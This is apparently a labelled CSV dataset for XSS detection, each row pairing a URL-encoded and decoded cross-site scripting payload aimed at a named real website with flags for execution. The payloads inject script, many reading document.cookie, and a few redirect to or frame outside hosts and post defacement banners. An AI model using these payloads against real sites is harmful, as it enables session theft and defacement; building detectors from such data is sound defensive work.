Payloads,Class,decoded,executed,parser_changed
http://forums.wow-europe.com/board.html?forumid=11088%3c/script%3e%3cscript%3ealert('airroxssed');%3<br>c/script%3e,Malicious,http://forums.wow-europe.com/board.html?forumid=11088</script><script>alert('airroxssed');</script>,True,True
http://tonalites.orange.fr/index.php?id=%22%27%3e%3cscript%3ealert%28/your%20been%20owned%20xss/%29%<br>3c/script%3e&amp;dub=1,Malicious,"http://tonalites.orange.fr/index.php?id=""'><script>alert(/your been owned xss/)</script>&dub=1",True,True
http://www.statebank1898.com/search.asp?q=1&amp;txtsearch=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)<br>%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;x=18&amp;y=15,Malicious,"http://www.statebank1898.com/search.asp?q=1&txtsearch='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>&x=18&y=15",True,True
http://www.michelin.it/it/auto/auto_ts.jsp?marque=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20<br>-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.michelin.it/it/auto/auto_ts.jsp?marque=>""><script 
>alert('xss by turkpower - canim turkiyem');</script><h1>xss by turkpower</h1></marquee>",True,True
http://www.mmrthefacts.nhs.uk/search.php?keywords=%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious,"http://www.mmrthefacts.nhs.uk/search.php?keywords=""><script>alert(""xss"")</script>",True,True
http://www.av-test.org/index.php?menue=1&amp;lang=0totalschaden&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;,Malicious,"http://www.av-test.org/index.php?menue=1&lang=0totalschaden""><script>alert(123)</script>",True,True
http://www.italo-motor.com/intranet/galeria/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.italo-motor.com/intranet/galeria/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://hindi.in.com/search.php?searchtext=%22%3e%3cscript%3ealert%28/xss%20by%2003storic/%29%3c%2fscript%3e&searchtextid=&x=15&y=11,Malicious,"http://hindi.in.com/search.php?searchtext=""><script>alert(/xss by 03storic/)</script>&searchtextid=&x=15&y=11",True,True
http://www.miniclip.com/php/en/search_results.php?query=%22%22%3e%3cscript%3ealert%28%22scr34m%22%29<br>%3b%3c%2fscript%3e,Malicious,"http://www.miniclip.com/php/en/search_results.php?query=""""><script>alert(""scr34m"");</script>",True,True
http://www.ducati.com/profile/login.jsp?urlloginsuccess=%22%3e%3cscript%3ealert(1337)%3c/script%3es,Malicious,"http://www.ducati.com/profile/login.jsp?urlloginsuccess=""><script>alert(1337)</script>s",True,True
"http://www.mpr.gov.ba/en/trazi.asp?trazi=/""><script>alert(1)</script>&imagefield.x=31&imagefield.y=22",Malicious,"http://www.mpr.gov.ba/en/trazi.asp?trazi=/""><script>alert(1)</script>&imagefield.x=31&imagefield.y=22",True,True
http://www.sciops.esa.int/index.php?project=esacfaculty&amp;page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;,Malicious,"http://www.sciops.esa.int/index.php?project=esacfaculty&page=""><script>alert(document.cookie)</script>",True,True
http://www.gametrailers.com/gameplay.php?order_by=date+desc%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6<br>c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32<br>%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%<br>34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://www.gametrailers.com/gameplay.php?order_by=date desc"">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
http://www.contemporarywatercolours.co.uk/servlet/controllerservlet/showcollectionlist?collectionid=<br>&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.contemporarywatercolours.co.uk/servlet/controllerservlet/showcollectionlist?collectionid=""><script>alert(""maxwel"")</script>",True,True
http://www.warwickref.com/igallery33/login.asp?folder=referees&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.warwickref.com/igallery33/login.asp?folder=referees&n=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.wen-tech.com/contact.asp?id=10&amp;name=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cmarque<br>e%3e%3ch1%3est@r-gaz3r%3c/h1%3e%3c/marquee%3e,Malicious,http://www.wen-tech.com/contact.asp?id=10&name=<script>alert(/st@r-gaz3r/)</script><marquee><h1>st@r-gaz3r</h1></marquee>,True,True
http://www.rinkle.com/abbypics/login.asp?n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.rinkle.com/abbypics/login.asp?n=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://finance.aol.com/ukw/quotes/charts?dr=999&amp;symbs=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e&amp;<br>x=0&amp;y=0&amp;ag=&amp;index=&amp;te=line&amp;se=default&amp;vl=on&amp;hs=on&amp;vs=on&amp;sym=&amp;exch=gbr&amp;state=1&amp;settings=1&amp;vl1=on&amp;ss1=<br>on&amp;dv1=off&amp;hs1=on&amp;vs1=on&amp;scs=0&amp;daysb4=0&amp;fromdate=&amp;todate=&amp;freq=1&amp;timeframe=0,Malicious,"http://finance.aol.com/ukw/quotes/charts?dr=999&symbs=""><script>alert(1)</script>&x=0&y=0&ag=&index=&te=line&se=default&vl=on&hs=on&vs=on&sym=&exch=gbr&state=1&settings=1&vl1=on&ss1=on&dv1=off&hs1=on&vs1=on&scs=0&daysb4=0&fromdate=&todate=&freq=1&timeframe=0",True,True
https://auth.isafe.org/reg/register1.php?ref_url=http%3a//www.isafe.org&quot;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"https://auth.isafe.org/reg/register1.php?ref_url=http://www.isafe.org""""><script>alert(1)</script>",True,True
http://www.chcf.org/error/index.cfm?eurl=http%3a%2f%2fwww%2echcf%2eorg%2ftopics%2findex%2ecfm%3ftopi<br>c%3d%22%3e%3cscript%3ealert%28document%2ecookie%29%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3eby%2bnarcot<br>icxs%3c%2fh1%3e%3c%2fmarquee%3e&amp;etype=chcf.missing_content&amp;emessage=invalid%20topic%20id%20passed.&amp;e<br>detail=&amp;ecode=,Malicious,"http://www.chcf.org/error/index.cfm?eurl=http://www.chcf.org/topics/index.cfm?topic=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>&etype=chcf.missing_content&emessage=invalid topic id passed.&edetail=&ecode=",True,True
"http://globoesporte.globo.com/esp/home/0,,4355,00.html?q=%3cscript%3ealert('pwned')%3c/script%3e&amp;op=<br>fotos",Malicious,"http://globoesporte.globo.com/esp/home/0,,4355,00.html?q=<script>alert('pwned')</script>&op=fotos",True,True
http://www.hotscripts.com/helpdesk/index.php?mod_id=2&amp;kb_ask=%22%3e%3cscript%3e+alert%28%22hacked by<br>deli hacker %22%29+%3c%2fscript%3e,Malicious,"http://www.hotscripts.com/helpdesk/index.php?mod_id=2&kb_ask=""><script> alert(""hacked bydeli hacker "") </script>",True,True
http://www.wi-fi.org/searchresults.php?c=11&amp;sp=security&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.wi-fi.org/searchresults.php?c=11&sp=security""><script>alert(document.cookie)</script>",True,True
http://www.ain.fr/display.jsp?text=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e%<br>3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;mode=all&amp;catname=true&amp;searchinfiles=tr<br>ue&amp;searchinarchives=false&amp;replacefiledoc=true&amp;jsp=custom%2fcg01%2frecherche%2fquery.jsp&amp;id=j_9&amp;opsea<br>rch.x=4&amp;opsearch.y=13,Malicious,"http://www.ain.fr/display.jsp?text='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>&mode=all&catname=true&searchinfiles=true&searchinarchives=false&replacefiledoc=true&jsp=custom/cg01/recherche/query.jsp&id=j_9&opsearch.x=4&opsearch.y=13",True,True
http://www.talonline.ca/searchalberta/search.jsp?sessionid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.talonline.ca/searchalberta/search.jsp?sessionid=""><script>alert(""maxwel"")</script>",True,True
http://www.capegateway.gov.za/search/index.php?q=error%22%3e%3cscript%20language=javascript%3ealert%<br>28document.cookie%29;%3c/script%3e,Malicious,"http://www.capegateway.gov.za/search/index.php?q=error""><script language=javascript>alert(document.cookie);</script>",True,True
http://dieter.krakor.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdo<br>or&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://dieter.krakor.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
"http://goodtimes.ndtv.com/video/videosearchlisting.aspx?keyword='>""><script>alert(/hexon/)</script>",Malicious,"http://goodtimes.ndtv.com/video/videosearchlisting.aspx?keyword='>""><script>alert(/hexon/)</script>",True,True
http://www.troispourcent.com/index.php?lang=en/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious,"http://www.troispourcent.com/index.php?lang=en/""><script>alert('xss by atm0n3r')</script>",True,True
http://hbk-gaia.dyndns.org/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/scr<br>ipt%3e,Malicious,"http://hbk-gaia.dyndns.org/orz/orz.cgi/-/xssed.com/'>"">'><script>alert(""xss"")</script>",True,True
http://www.tomshw.it/news_site.php?sezione=%22%3e%3cscript%3ealert(/hani/)%3c/script%3e,Malicious,"http://www.tomshw.it/news_site.php?sezione=""><script>alert(/hani/)</script>",True,True
http://spor.mynet.com/arama/?s=rate&amp;pg=q&amp;plq=%22%3ehttp://finans.mynet.com/arama/?s=rate&amp;pg=q&amp;plq=%2<br>2%3e%3ch1%3ehacked%20by%20st@rext%20and%20candark%20trtekforum.com%3c/h1%3e%3cscript%3ealert(%22by%2<br>0st@rext%20%20candark%20trtekforum.com%22)%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%<br>3e%3cmeta%20http-equiv=%22refresh%22%20content=%222;url=http://lht.by.ru/uyar1.html%22%3e,Malicious,"http://spor.mynet.com/arama/?s=rate&pg=q&plq="">http://finans.mynet.com/arama/?s=rate&pg=q&plq=""><h1>hacked by st@rext and candark trtekforum.com</h1><script>alert(""by st@rext  candark trtekforum.com"")</script><script>alert(document.cookie)</script><meta http-equiv=""refresh"" content=""2;url=http://lht.by.ru/uyar1.html"">",True,True
http://www.buenosaires.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious,"http://www.buenosaires.gov.ar/avisos/?menu_id=""><script>alert(/xss/)</script>",True,True
http://www.richinternet.de/blog/index.cfm?entry=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.richinternet.de/blog/index.cfm?entry=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.therme.net/cgi-bin/site_search.pl?group=letter_a&amp;search=a&amp;html-nr=%3e%22%3e%3ctitle%3enor<br>ehem%20was%20here%3c/title%3e%3cscript%3ealert('norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3<br>e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cim<br>g%20src=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ci<br>frame%20src=http://jersain.iespana.es/xss.html%20%3c,Malicious,"http://www.therme.net/cgi-bin/site_search.pl?group=letter_a&search=a&html-nr=>""><title>norehem was here</title><script>alert('norehem was here!!')</script><h1><h1><h1><marquee>norehem was here</marquee></h1></h1></h1><center><img src=""http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif""></center><iframe src=http://jersain.iespana.es/xss.html <",True,True
http://www.hdfte.gov.cn/index.php?hostid=2}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source))<br>;%3c/script%3e,Malicious,http://www.hdfte.gov.cn/index.php?hostid=2}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,True,True
http://www.aromascope.com/index.php?s=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%<br>3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;searchbutton=go!,Malicious,"http://www.aromascope.com/index.php?s='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>&searchbutton=go!",True,True
http://www.digitalpoint.com/tools/suggestion/?keywords=testicles&lt;/title&gt;&lt;script&gt;alert(document.cooki<br>e);&lt;/script&gt;&lt;!-- &amp;country=us,Malicious,http://www.digitalpoint.com/tools/suggestion/?keywords=testicles</title><script>alert(document.cookie);</script><!-- &country=us,True,True
http://ronsloan.net/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://ronsloan.net/phpinfo.php?a[]=""><script>alert(document.cookie)</script>",True,True
http://lara.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3e%3cscript%3ealert(/xssed/);%3c/script<br>%3e,Malicious,"http://lara.tsj.gov.ve/noticias/noticia_detallada.asp?id=""><script>alert(/xssed/);</script>",True,True
http://camp2006.alsoufi.co.uk/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://camp2006.alsoufi.co.uk/igallery/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://suche.kas.de/cgi-bin/search.cgi?q=%22%3e%3cscript%3ealert(%22pwnd%20for%20big-h(;%22)%3c/scri<br>pt%3e,Malicious,"http://suche.kas.de/cgi-bin/search.cgi?q=""><script>alert(""pwnd for big-h(;"")</script>",True,True
http://h.u.la/dance/?p=1&amp;kenken=%22%3e%27%3e%3cscript%3ealert%28%22kusomiso.com%22%29%3c%2fscript%3e,Malicious,"http://h.u.la/dance/?p=1&kenken="">'><script>alert(""kusomiso.com"")</script>",True,True
http://www.vanila.biz/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.vanila.biz/igallery/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.keyworthy.com/keyword/rock+star+supernova%22%3e%3cscript%3ealert(document.cookie)%3c/scri<br>pt%3e,Malicious,"http://www.keyworthy.com/keyword/rock star supernova""><script>alert(document.cookie)</script>",True,True
http://clearbluevisions.net/u.asp?u=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://clearbluevisions.net/u.asp?u=""><script>alert(""maxwel"")</script>",True,True
http://www.puntoradiotudela.com/descargas.php?programa=%3cscript%3ealert(1);document.write(%22%3ch1%<br>3e0wn3d%3c/h1%3e%22)%3c/script%3e,Malicious,"http://www.puntoradiotudela.com/descargas.php?programa=<script>alert(1);document.write(""<h1>0wn3d</h1>"")</script>",True,True
http://french.wunderground.com/global/stations/68588.html?bannertypeclick=big2%27%22%3e%3c/title%3e%<br>3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://french.wunderground.com/global/stations/68588.html?bannertypeclick=big2'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.sigames.com/clickthru.php?url=&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(&quot;skyr3x&quot;)&lt;/script&gt;,Malicious,"http://www.sigames.com/clickthru.php?url=""></script><script>alert(""skyr3x"")</script>",True,True
http://www.gaytube.com/signup.php?next=%22%3e%3cscript%3ealert(/xssed%20by%20dr.optix.%20why?%20beca<br>use%20i%20can!/)%3c/script%3e,Malicious,"http://www.gaytube.com/signup.php?next=""><script>alert(/xssed by dr.optix. why? because i can!/)</script>",True,True
https://dct.sun.com/dct/forms/reg_us_0604_101_0.jsp?email=xylitol@fbi.gov&amp;mid=1161186194&amp;cid=e83%27%<br>22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e75g,Malicious,"https://dct.sun.com/dct/forms/reg_us_0604_101_0.jsp?email=xylitol@fbi.gov&mid=1161186194&cid=e83'""></title><script>alert(1337)</script>75g",True,True
http://www.nallihantutkusu.com/resimgaleri/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.nallihantutkusu.com/resimgaleri/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.spor3.com/haber.php?haber_id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.spor3.com/haber.php?haber_id=""><script>alert(document.cookie)</script>",True,True
http://www.perpetual-traffic.com/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;src=,Malicious,"http://www.perpetual-traffic.com/register.php?ref=""><script>alert(1);</script>&src=",True,True
http://www.fahcsia.gov.au/internet/jennymacklin.nsf/search?searchview&amp;query=%22%3e%27%3e%3cscript%3e<br>alert(123)%3c/script%3e&amp;start=1&amp;count=10&amp;layout=main,Malicious,"http://www.fahcsia.gov.au/internet/jennymacklin.nsf/search?searchview&query="">'><script>alert(123)</script>&start=1&count=10&layout=main",True,True
http://lms.larc.nasa.gov/search.cfm?cont=yes&amp;keywords=&amp;num=&lt;&quot;&lt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&amp;class=&amp;search=search,Malicious,"http://lms.larc.nasa.gov/search.cfm?cont=yes&keywords=&num=<""<<script>alert(document.cookie)</script>&class=&search=search",True,True
http://www.tamindir.com/program/&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;wwwraptr.us.tc&lt;/h1&gt;,Malicious,"http://www.tamindir.com/program/""><script>alert(document.cookie)</script><h1>wwwraptr.us.tc</h1>",True,True
http://boourns.cjb.net/images.php?tag=%22%3e%3cscript%3ealert%28/xss/.source%29%3c/script%3e,Malicious,"http://boourns.cjb.net/images.php?tag=""><script>alert(/xss/.source)</script>",True,True
http://www.kataweb.it/go?page=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b%3c%2fscript%3e,Malicious,"http://www.kataweb.it/go?page=""><script>alert(/xss by redtuning/);</script>",True,True
http://www.uni-oldenburg.de/cgi-bin/unidruck.cgi?url=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.uni-oldenburg.de/cgi-bin/unidruck.cgi?url=""><script>alert(""maxwel"")</script>",True,True
http://to.gov.br/busca/%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,http://to.gov.br/busca/<script>alert(document.cookie)</script>,True,True
http://www.3mori.co.jp/newsboard/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%20-%20unkn0wn<br>.eu%27%29%3c%2fscript%3e,Malicious,"http://www.3mori.co.jp/newsboard/newsboard.cgi?num=>""><script>alert('ins - unkn0wn.eu')</script>",True,True
http://www.environment.gov.pk/site_search.asp?search=%22%3e%3cscript%3ealert%28%27xss+in+government+<br>%21neo%27%29%3c%2fscript%3e&amp;submit=search+%3e%3e&amp;mode=allwords,Malicious,"http://www.environment.gov.pk/site_search.asp?search=""><script>alert('xss in government !neo')</script>&submit=search >>&mode=allwords",True,True
http://internetmap.info/cgi-bin/engine.cgi?a=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3c<br>script%3ealert('norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20<br>was%20here%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernauti<br>ca.com/forocibernautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespa<br>na.es/xss.html%20%3c,Malicious,"http://internetmap.info/cgi-bin/engine.cgi?a=>""><title>norehem was here</title><script>alert('norehem was here!!')</script><h1><h1><h1><marquee>norehem was here</marquee></h1></h1></h1><center><img src=""http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif""></center><iframe src=http://jersain.iespana.es/xss.html <",True,True
